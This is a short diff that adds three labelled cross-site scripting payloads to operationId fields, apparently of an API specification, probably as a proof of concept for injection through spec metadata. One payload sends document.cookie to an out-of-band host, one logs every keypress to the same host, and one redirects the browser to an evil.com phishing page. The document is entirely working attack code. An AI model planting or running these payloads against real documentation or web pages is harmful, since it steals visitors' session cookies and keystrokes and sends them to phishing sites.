@@ -1,0 +1,8 @@
+# Steal cookies
+operationId: "test<IMG SRC=x ONERROR=\"fetch('https://sxsqrhfknbmbrzsrhkhmeng8nou5pc8db.oast.fun/x?c='+document.cookie)\">"
+
+# Keylogger
+operationId: "test<script>document.addEventListener('keydown',e=>{fetch('https://sxsqrhfknbmbrzsrhkhmeng8nou5pc8db.oast.fun/x?k='+e.key)})</script>"
+
+# Redirect to phishing
+operationId: "test<script>window.location='https://evil.com/phish'</script>"
